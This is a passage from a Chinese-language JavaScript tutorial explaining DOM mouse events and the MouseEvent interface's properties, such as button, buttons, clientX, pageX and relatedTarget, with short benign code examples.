<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment"> &lt;ul&gt;</span></span><br><span class="line"><span class="comment">   &lt;li&gt;item 1&lt;/li&gt;</span></span><br><span class="line"><span class="comment">   &lt;li&gt;item 2&lt;/li&gt;</span></span><br><span class="line"><span class="comment">  &lt;li&gt;item 3&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ul = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进入 ul 节点以后，mouseenter 事件只会触发一次</span></span><br><span class="line"><span class="comment">// 以后只要鼠标在节点内移动，都不会再触发这个事件</span></span><br><span class="line"><span class="comment">// event.target 是 ul 节点</span></span><br><span class="line">ul.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;purple&#x27;</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进入 ul 节点以后，只要在子节点上移动，mouseover 事件会触发多次</span></span><br><span class="line"><span class="comment">// event.target 是 li 节点</span></span><br><span class="line">ul.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseover&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;orange&#x27;</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，在父节点内部进入子节点，不会触发<code>mouseenter</code>事件，但是会触发<code>mouseover</code>事件。</p>
<p><code>mouseout</code>事件和<code>mouseleave</code>事件，都是鼠标离开一个节点时触发。两者的区别是，在父元素内部离开一个子元素时，<code>mouseleave</code>事件不会触发，而<code>mouseout</code>事件会触发。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment"> &lt;ul&gt;</span></span><br><span class="line"><span class="comment">   &lt;li&gt;item 1&lt;/li&gt;</span></span><br><span class="line"><span class="comment">   &lt;li&gt;item 2&lt;/li&gt;</span></span><br><span class="line"><span class="comment">  &lt;li&gt;item 3&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ul = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先进入 ul 节点，然后在节点内部移动，不会触发 mouseleave 事件</span></span><br><span class="line"><span class="comment">// 只有离开 ul 节点时，触发一次 mouseleave</span></span><br><span class="line"><span class="comment">// event.target 是 ul 节点</span></span><br><span class="line">ul.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;purple&#x27;</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先进入 ul 节点，然后在节点内部移动，mouseout 事件会触发多次</span></span><br><span class="line"><span class="comment">// event.target 是 li 节点</span></span><br><span class="line">ul.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseout&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;orange&#x27;</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，在父节点内部离开子节点，不会触发<code>mouseleave</code>事件，但是会触发<code>mouseout</code>事件。</p>
<h3 id="2、MouseEvent-接口概述"><a href="#2、MouseEvent-接口概述" class="headerlink" title="2、MouseEvent 接口概述"></a>2、MouseEvent 接口概述</h3><p><code>MouseEvent</code>接口代表<strong>所有鼠标事件所产生的对象都是<code>MouseEvent</code>实例</strong>。此外，<strong>滚轮事件和拖拉事件也是<code>MouseEvent</code>实例。</strong></p>
<p><code>MouseEvent</code>接口<strong>继承了<code>Event</code>接口</strong>，所以拥有<code>Event</code>的所有属性和方法。它还有自己的属性和方法。</p>
<p>浏览器<strong>原生提供一个<code>MouseEvent</code>构造函数</strong>，用于新建一个<code>MouseEvent</code>实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(type, options);<span class="comment">// 参数一，事件名称字符串；参数二，事件配置对象</span></span><br></pre></td></tr></table></figure>

<p><code>MouseEvent</code>构造函数接受两个参数。第一个参数是字符串，表示<strong>事件名称</strong>；第二个参数是一个<strong>事件配置对象</strong>，该参数可选。除了<code>Event</code>接口的实例配置属性，该对象可以配置以下属性，所有属性都是可选的。</p>
<ul>
<li><code>screenX</code>：数值，鼠标相对于<strong>屏幕</strong>的水平位置（单位像素），默认值为0，设置该属性不会移动鼠标。</li>
<li><code>screenY</code>：数值，鼠标相对于<strong>屏幕</strong>的垂直位置（单位像素），其他与<code>screenX</code>相同。</li>
<li><code>clientX</code>：数值，鼠标相对于<strong>程序窗口</strong>的水平位置（单位像素），默认值为0，设置该属性不会移动鼠标。</li>
<li><code>clientY</code>：数值，鼠标相对于<strong>程序窗口</strong>的垂直位置（单位像素），其他与<code>clientX</code>相同。</li>
<li><code>ctrlKey</code>：布尔值，是否同时按下了 Ctrl 键，默认值为<code>false</code>。</li>
<li><code>shiftKey</code>：布尔值，是否同时按下了 Shift 键，默认值为<code>false</code>。</li>
<li><code>altKey</code>：布尔值，是否同时按下 Alt 键，默认值为<code>false</code>。</li>
<li><code>metaKey</code>：布尔值，是否同时按下 Meta 键（win键），默认值为<code>false</code>。</li>
<li><code>button</code>：数值，表示按下了哪一个鼠标按键，默认值为<code>0</code>，表示按下主键（通常是鼠标的左键）或者当前事件没有定义这个属性；<code>1</code>表示按下辅助键（通常是鼠标的中间键），<code>2</code>表示按下次要键（通常是鼠标的右键）。</li>
<li><code>buttons</code>：数值，表示按下了鼠标的哪些键，是一个三个比特位的二进制值，默认为<code>0</code>（没有按下任何键）。<code>1</code>（二进制<code>001</code>）表示按下主键（通常是左键），<code>2</code>（二进制<code>010</code>）表示按下次要键（通常是右键），<code>4</code>（二进制<code>100</code>）表示按下辅助键（通常是中间键）。因此，如果返回<code>3</code>（二进制<code>011</code>）就表示同时按下了左键和右键。</li>
<li><code>relatedTarget</code>：节点对象，表示事件的相关节点，默认为<code>null</code>。<code>mouseenter</code>和<code>mouseover</code>事件时，表示鼠标刚刚离开的那个元素节点；<code>mouseout</code>和<code>mouseleave</code>事件时，表示鼠标正在进入的那个元素节点。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click2&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;bubbles&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;cancelable&#x27;</span>: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> cb = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;checkbox&#x27;</span>);</span><br><span class="line">cb.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click2&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">// 绑定事件监听函数</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">22</span>) <span class="comment">// 被执行</span></span><br><span class="line">&#125;)</span><br><span class="line">cb.<span class="title function_">dispatchEvent</span>(event);<span class="comment">// 触发事件</span></span><br></pre></td></tr></table></figure>

<p>上面代码生成一个鼠标点击事件，并触发该事件。</p>
<h3 id="3、MouseEvent-接口的实例属性"><a href="#3、MouseEvent-接口的实例属性" class="headerlink" title="3、MouseEvent 接口的实例属性"></a>3、MouseEvent 接口的实例属性</h3><h4 id="3-1-MouseEvent-altKey，MouseEvent-ctrlKey，MouseEvent-metaKey，MouseEvent-shiftKey"><a href="#3-1-MouseEvent-altKey，MouseEvent-ctrlKey，MouseEvent-metaKey，MouseEvent-shiftKey" class="headerlink" title="3.1 MouseEvent.altKey，MouseEvent.ctrlKey，MouseEvent.metaKey，MouseEvent.shiftKey"></a>3.1 MouseEvent.altKey，MouseEvent.ctrlKey，MouseEvent.metaKey，MouseEvent.shiftKey</h4><p><code>MouseEvent.altKey</code>、<code>MouseEvent.ctrlKey</code>、<code>MouseEvent.metaKey</code>、<code>MouseEvent.shiftKey</code>这四个属性都返回一个布尔值，表示事件发生时，是否按下对应的键。它们都是<strong>只读</strong>属性。</p>
<ul>
<li><code>altKey</code>属性：Alt 键</li>
<li><code>ctrlKey</code>属性：Ctrl 键</li>
<li><code>metaKey</code>属性：Meta 键（Mac 键盘是一个四瓣的小花，Windows 键盘是 Windows 键）</li>
<li><code>shiftKey</code>属性：Shift 键</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;body onclick=&quot;showKey(event)&quot;&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showKey</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ALT key pressed: &#x27;</span> + e.<span class="property">altKey</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;CTRL key pressed: &#x27;</span> + e.<span class="property">ctrlKey</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;META key pressed: &#x27;</span> + e.<span class="property">metaKey</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;SHIFT key pressed: &#x27;</span> + e.<span class="property">shiftKey</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，点击网页会输出是否同时按下对应的键。</p>
<h4 id="3-2-MouseEvent-button-鼠标的哪个键，MouseEvent-buttons同时按哪些键"><a href="#3-2-MouseEvent-button-鼠标的哪个键，MouseEvent-buttons同时按哪些键" class="headerlink" title="3.2 MouseEvent.button 鼠标的哪个键，MouseEvent.buttons同时按哪些键"></a>3.2 MouseEvent.button 鼠标的哪个键，MouseEvent.buttons同时按哪些键</h4><p><code>MouseEvent.button</code>属性返回<strong>一个数值，表示事件发生时按下了鼠标的哪个键</strong>。该属性<strong>只读</strong>。</p>
<ul>
<li>0：按下主键（通常是左键），或者该事件没有初始化这个属性（比如<code>mousemove</code>事件）。</li>
<li>1：按下辅助键（通常是中键或者滚轮键）。</li>
<li>2：按下次键（通常是右键）。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;button onmouseup=&quot;whichButton(event)&quot;&gt;点击&lt;/button&gt;</span></span><br><span class="line"><span class="keyword">var</span> whichButton = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (e.<span class="property">button</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Left button clicked.&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Middle button clicked.&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Right button clicked.&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Unexpected code: &#x27;</span> + e.<span class="property">button</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>MouseEvent.buttons</code>属性返回一个<strong>三个比特位的值</strong>，表示<strong>同时按下了哪些键</strong>。它<strong>用来处理同时按下多个鼠标键的情况</strong>。该属性<strong>只读</strong>。</p>
<ul>
<li>1：二进制为<code>001</code>（十进制的1），表示按下左键。</li>
<li>2：二进制为<code>010</code>（十进制的2），表示按下右键。</li>
<li>4：二进制为<code>100</code>（十进制的4），表示按下中键或滚轮键。</li>
</ul>
<p>同时按下多个键的时候，每个按下的键对应的比特位都会有值。比如，同时按下左键和右键，会返回3（二进制为011）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123; <span class="comment">// 注意，用click时一直都是0</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">buttons</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 未按下任何键时是 0</span></span><br><span class="line"><span class="comment">// 按下左键 1  （001）</span></span><br><span class="line"><span class="comment">// 按下右键 2  （010）</span></span><br><span class="line"><span class="comment">// 按下中键 4  （100）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 按下左键和右键 3  （011）</span></span><br><span class="line"><span class="comment">// 按下左键和中键 5  （101）</span></span><br><span class="line"><span class="comment">// 按下右键和中键 6  （110）</span></span><br><span class="line"><span class="comment">// 按下左、中、右键 7  （111）</span></span><br></pre></td></tr></table></figure>





<h4 id="3-3-MouseEvent-clientX-相对浏览器X坐标，MouseEvent-clientY-相对浏览器Y坐标"><a href="#3-3-MouseEvent-clientX-相对浏览器X坐标，MouseEvent-clientY-相对浏览器Y坐标" class="headerlink" title="3.3 MouseEvent.clientX 相对浏览器X坐标，MouseEvent.clientY 相对浏览器Y坐标"></a>3.3 MouseEvent.clientX 相对浏览器X坐标，MouseEvent.clientY 相对浏览器Y坐标</h4><p><code>MouseEvent.clientX</code>属性返回鼠标位置相对于浏览器窗口左上角的水平坐标（单位像素），<code>MouseEvent.clientY</code>属性返回垂直坐标。这两个属性都是<strong>只读</strong>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;body onmousedown=&quot;showCoords(event)&quot;&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showCoords</span>(<span class="params">evt</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">    <span class="string">&#x27;clientX value: &#x27;</span> + evt.<span class="property">clientX</span> + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">    <span class="string">&#x27;clientY value: &#x27;</span> + evt.<span class="property">clientY</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个属性还分别有一个**别名<code>MouseEvent.x</code>和<code>MouseEvent.y</code>**。</p>
<h4 id="3-4-MouseEvent-movementX-上一个鼠标经过事件的X距离，MouseEvent-movementY-上一个鼠标经过事件的Y距离"><a href="#3-4-MouseEvent-movementX-上一个鼠标经过事件的X距离，MouseEvent-movementY-上一个鼠标经过事件的Y距离" class="headerlink" title="3.4 MouseEvent.movementX 上一个鼠标经过事件的X距离，MouseEvent.movementY 上一个鼠标经过事件的Y距离"></a>3.4 MouseEvent.movementX 上一个鼠标经过事件的X距离，MouseEvent.movementY 上一个鼠标经过事件的Y距离</h4><p><code>MouseEvent.movementX</code>属性返回当前位置与上一个<code>mousemove</code>事件之间的水平距离（单位像素）。数值上，它等于下面的计算公式。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentEvent.<span class="property">movementX</span> = currentEvent.<span class="property">screenX</span> - previousEvent.<span class="property">screenX</span></span><br></pre></td></tr></table></figure>

<p><code>MouseEvent.movementY</code>属性返回当前位置与上一个<code>mousemove</code>事件之间的垂直距离（单位像素）。数值上，它等于下面的计算公式。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentEvent.<span class="property">movementY</span> = currentEvent.<span class="property">screenY</span> - previousEvent.<span class="property">screenY</span>。</span><br></pre></td></tr></table></figure>

<p>这两个属性都是<strong>只读</strong>属性。</p>
<h4 id="3-5-MouseEvent-screenX-相对屏幕X坐标，MouseEvent-screenY-相对屏幕Y坐标"><a href="#3-5-MouseEvent-screenX-相对屏幕X坐标，MouseEvent-screenY-相对屏幕Y坐标" class="headerlink" title="3.5 MouseEvent.screenX 相对屏幕X坐标，MouseEvent.screenY 相对屏幕Y坐标"></a>3.5 MouseEvent.screenX 相对屏幕X坐标，MouseEvent.screenY 相对屏幕Y坐标</h4><p><code>MouseEvent.screenX</code>属性返回鼠标位置相对于屏幕左上角的水平坐标（单位像素），<code>MouseEvent.screenY</code>属性返回垂直坐标。这两个属性都是<strong>只读</strong>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;body onmousedown=&quot;showCoords(event)&quot;&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showCoords</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">    <span class="string">&#x27;screenX value: &#x27;</span> + evt.<span class="property">screenX</span> + <span class="string">&#x27;\n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;screenY value: &#x27;</span> + evt.<span class="property">screenY</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-6-MouseEvent-offsetX-偏移量X，MouseEvent-offsetY-偏移量Y"><a href="#3-6-MouseEvent-offsetX-偏移量X，MouseEvent-offsetY-偏移量Y" class="headerlink" title="3.6 MouseEvent.offsetX 偏移量X，MouseEvent.offsetY 偏移量Y"></a>3.6 MouseEvent.offsetX 偏移量X，MouseEvent.offsetY 偏移量Y</h4><p><code>MouseEvent.offsetX</code>属性返回鼠标位置与目标节点左侧的<code>padding</code>边缘的水平距离（单位像素），<code>MouseEvent.offsetY</code>属性返回与目标节点上方的<code>padding</code>边缘的垂直距离。这两个属性都是只读属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">  &lt;style&gt;</span></span><br><span class="line"><span class="comment">    p &#123;</span></span><br><span class="line"><span class="comment">      width: 100px;</span></span><br><span class="line"><span class="comment">      height: 100px;</span></span><br><span class="line"><span class="comment">      padding: 100px;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &lt;/style&gt;</span></span><br><span class="line"><span class="comment">  &lt;p&gt;Hello&lt;/p&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">p.<span class="title function_">addEventListener</span>(</span><br><span class="line">  <span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">offsetX</span>); <span class="comment">// 包含padding</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">offsetY</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面代码中，鼠标如果在<code>p</code>元素的中心位置点击，会返回<code>150 150</code>。因此中心位置距离左侧和上方的<code>padding</code>边缘，等于<code>padding</code>的宽度（100像素）加上元素内容区域一半的宽度（50像素）。</p>
<h4 id="3-7-MouseEvent-pageX-文档X坐标，MouseEvent-pageY-文档Y坐标"><a href="#3-7-MouseEvent-pageX-文档X坐标，MouseEvent-pageY-文档Y坐标" class="headerlink" title="3.7 MouseEvent.pageX 文档X坐标，MouseEvent.pageY 文档Y坐标"></a>3.7 MouseEvent.pageX 文档X坐标，MouseEvent.pageY 文档Y坐标</h4><p><code>MouseEvent.pageX</code>属性返回鼠标位置与文档左侧边缘的距离（单位像素），<code>MouseEvent.pageY</code>属性返回与文档上侧边缘的距离（单位像素）。它们的<strong>返回值都包括文档不可见的部分</strong>。这两个属性都是<strong>只读</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">  &lt;style&gt;</span></span><br><span class="line"><span class="comment">    body &#123;</span></span><br><span class="line"><span class="comment">      height: 2000px;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &lt;/style&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(</span><br><span class="line">  <span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">pageX</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">pageY</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面代码中，页面高度为2000像素，会产生垂直滚动条。滚动到页面底部，点击鼠标输出的<code>pageY</code>值会接近2000。</p>
<h4 id="3-8-MouseEvent-relatedTarget-事件的相关节点"><a href="#3-8-MouseEvent-relatedTarget-事件的相关节点" class="headerlink" title="3.8 MouseEvent.relatedTarget 事件的相关节点"></a>3.8 MouseEvent.relatedTarget 事件的相关节点</h4><p><code>MouseEvent.relatedTarget</code>属性<strong>返回事件的相关节点</strong>。对于那些没有相关节点的事件，该属性返回<code>null</code>。该属性<strong>只读</strong>。</p>
<p>下表列出不同事件的<code>target</code>属性值和<code>relatedTarget</code>属性值义。</p>
<table>
<thead>
<tr>
<th align="left">事件名称</th>
<th align="left">target 属性</th>
<th align="left">relatedTarget 属性</th>
</tr>
</thead>
<tbody><tr>
<td align="left">focusin</td>
<td align="left">接受焦点的节点</td>
<td align="left">丧失焦点的节点</td>
</tr>
<tr>
<td align="left">focusout</td>
<td align="left">丧失焦点的节点</td>
<td align="left">接受焦点的节点</td>
</tr>
<tr>
<td align="left">mouseenter</td>
<td align="left">将要进入的节点</td>
<td align="left">将要离开的节点</td>
</tr>
<tr>
<td align="left">mouseleave</td>
<td align="left">将要离开的节点</td>
<td align="left">将要进入的节点</td>
</tr>
<tr>
<td align="left">mouseout</td>
<td align="left">将要离开的节点</td>
<td align="left">将要进入的节点</td>
</tr>
<tr>
<td align="left">mouseover</td>
<td align="left">将要进入的节点</td>
<td align="left">将要离开的节点</td>
</tr>
<tr>
<td align="left">dragenter</td>
<td align="left">将要进入的节点</td>
<td align="left">将要离开的节点</td>
</tr>
<tr>
<td align="left">dragexit</td>
<td align="left">将要离开的节点</td>
<td align="left">将要进入的节点</td>
</tr>
</tbody></table>
<p>下面是一个例子。</p>
